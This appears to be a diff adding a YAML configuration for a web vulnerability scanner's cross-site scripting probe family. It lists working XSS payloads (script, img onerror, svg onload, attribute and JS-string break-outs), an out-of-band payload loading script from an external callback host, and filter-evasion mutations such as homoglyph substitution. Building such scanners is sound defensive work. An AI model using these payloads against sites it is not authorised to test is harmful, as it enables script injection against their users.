@@ -1,0 +1,54 @@
+family_id: xss
+description: >-
+  Cross-Site Scripting probes for reflected, stored, DOM-based, and attribute
+  contexts. Seeds are the canonical OWASP WSTG examples; runtime mutations
+  defeat naive substring filters and HTML-encoding misconfigurations.
+cwe_ids: [79]
+owasp_top10:
+  - 'A03:2021'
+risk_level: medium
+requires_approval: false
+oast_required: true
+payloads:
+  - id: script_alert
+    template: "<script>alert({canary})</script>"
+    confidence: suspected
+    notes: Classic reflected-XSS probe with a canary marker.
+  - id: img_onerror
+    template: "<img src=x onerror=alert({canary})>"
+    confidence: suspected
+    notes: Image-tag onerror handler; bypasses many <script> blockers.
+  - id: svg_onload
+    template: "<svg/onload=alert({canary})>"
+    confidence: suspected
+    notes: SVG onload; useful where <img> is filtered.
+  - id: attribute_break
+    template: "\" autofocus onfocus=alert({canary}) x=\""
+    confidence: suspected
+    notes: Attribute-context break-out; assumes a value="..." sink.
+  - id: js_string_break
+    template: "';alert({canary});//"
+    confidence: suspected
+    notes: JS string-context break-out for inline-script sinks.
+  - id: oast_external_script
+    template: "<script src=//{oast_host}/{canary}.js></script>"
+    confidence: confirmed
+    notes: Out-of-band beacon; OAST DNS callback confirms execution.
+mutations:
+  - name: case_flip
+    description: HTML tag/attr names are case-insensitive; flips defeat substring filters.
+  - name: unicode_homoglyph
+    description: Substitute Cyrillic look-alikes to bypass naive denylists.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw payload (HTML body / DOM-sink context).
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for query-string reflection.
+  - name: html_entity
+    stages: [html]
+    description: HTML-entity-encoded; tests double-decoding sinks.
+  - name: unicode_only
+    stages: [unicode_escape]
+    description: \\uXXXX-escaped; useful in JS string-context sinks.
